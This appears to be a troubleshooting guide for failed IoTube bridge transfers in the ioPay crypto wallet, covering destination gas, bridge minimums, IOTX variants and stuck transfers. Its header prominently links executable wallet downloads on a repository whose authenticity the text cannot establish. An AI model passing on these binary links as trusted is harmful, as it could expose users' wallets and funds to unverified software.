![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# IoTube Swap Not Working? Fixing Bridge Errors in ioPay Wallet

IoTube swap failing is almost always one of five things, and they are cheap to rule out in this order: **an old build, missing gas on the destination chain, an amount below the bridge minimum, a token the bridge does not carry, or a network the app cannot reach.** Work down the list before you conclude the bridge is broken - and if the transaction is already mined, stop retrying.

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

"Swap" here means one of two different things, and mixing them up causes a lot of the confusion:

- **The IoTube bridge** - moving an asset from IoTeX to Ethereum, BSC or Polygon (or back), minting or releasing a representation on the other side.
- **The in-wallet token swap** - trading IOTX against XRC-20 tokens on IoTeX itself, with best-price routing and adjustable slippage. That is the [slippage settings page](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/iopay-wallet-token-swap-slippage-settings.md), not this one.

## 1. Are you on the current release?

The problems users reported were fixed in **v2.0.2, published 19 November 2026**, and a build older than that can still point at endpoints or mechanisms that have since changed. Eliminating it is the first step, before any debugging.

The app supports auto-update; if it has not offered you one, install the current asset for your platform over the existing app. Your accounts and phrase are unaffected by an update. [Update guide](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/updating-iopay-wallet-to-the-latest-version.md).

## 2. Is the destination chain's gas funded?

This is the single most common "stuck bridge" cause. A bridge transfer is **two** transactions: one on the source chain, one on the destination chain to deliver the asset. If the destination account has no gas, the second half cannot complete, and the transfer sits incomplete while the source side looks perfectly successful.

So: check that the account you are bridging **to** holds a little of the destination chain's native gas token. An address can receive the bridged asset and still be unable to complete the delivery.

## 3. Is the amount too small, or the token unsupported?

A bridge route shows a minimum, and it does not carry every token. A quoted fee that exceeds the amount, or a swap that will not build a transaction at all, is often the minimum talking.

And check **which** version of the asset you are moving. Four things carry the IOTX name - native, legacy ERC-20, wrapped and the retired CIOTX - and [the variant page](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/bridging-iotx-from-ethereum-to-iopay.md) sets them out with where each one lives. Bridging the wrong one, or expecting a bridged representation to stake as native IOTX, produces failures that look like bridge bugs and are not.

## 4. Can the app reach the network at all?

If the app is spinning, showing a connection error, or timing out on every screen, that is not a bridge problem. [Network errors](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-not-connecting-to-network.md) covers it. Bridging over a flaky VPN or a network that filters RPC endpoints will fail at the quote stage every time.

## 5. Is it mined but not credited?

If the source transaction is confirmed on-chain and the destination side has not credited, you are past the point where retrying helps. Do not re-send. Instead:

- **Read the status tracker.** The wallet shows a status per bridge transfer; "pending" and "failed" mean different things.
- **Check the destination address.** The destination should be the `io1...` or `0x...` form of the account you intended, on the destination chain. A transfer sent to the right account in the wrong format is recoverable only by using that chain's tooling - not by sending again.
- **Check the date.** If the transfer falls in the February-March 2026 window, the [IoTube incident page](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/what-iopay-users-should-know-about-the-iotube-incident.md) is the relevant reading. If it does not, it is an ordinary failure and the status tracker is the record.

## The two things users get wrong most

**Swapping ERC-20 IOTX for native IOTX without the redemption route.** Legacy ERC-20 IOTX on Ethereum is a separate asset from native IOTX on IoTeX. It is not stakeable and it does not become native by sitting in a wallet. [Bridging from Ethereum](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/bridging-iotx-from-ethereum-to-iopay.md) is the page that gets this right.

**Assuming a failed quote means a failed transfer.** A quote that cannot be produced - no route, amount below minimum, destination gas missing - means **nothing was signed and nothing moved**. No funds are lost when a quote fails. Conversely, a transaction that *was* signed and mined cannot be cancelled by a quote screen or by a support request.

## FAQ

**Why is IoTube swap not working?**
In order of likelihood: an outdated build, no gas on the destination chain, an amount under the bridge minimum, an unsupported token or the wrong IOTX variant, or a network that cannot reach the RPC endpoints. Work down the list.

**The swap button does nothing.**
That is a quote failure, not a transfer failure. Check the amount against the minimum, confirm the token is one the bridge carries, and confirm the app can reach the network at all.

**The quoted rate changed before I confirmed.**
Quotes are live and expire. If the rate moves past your tolerance, re-quote and read the new fee before signing. A quote that has gone stale will not submit - which is the behaviour you want.

**Did my funds disappear?**
If nothing was signed, no. If the source transaction is mined, the asset left your source-chain balance and is either credited on the destination or pending delivery. The status tracker and the destination address are the two things to check, in that order.

## Related

- [How to use the IoTube bridge](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/how-to-use-the-iotube-bridge-in-iopay-wallet.md) - the normal path, step by step.
- [Bridging IOTX from Ethereum](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/bridging-iotx-from-ethereum-to-iopay.md) - the variant problem in full.
- [The IoTube incident](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/what-iopay-users-should-know-about-the-iotube-incident.md) - dated facts, claims route, no promises.
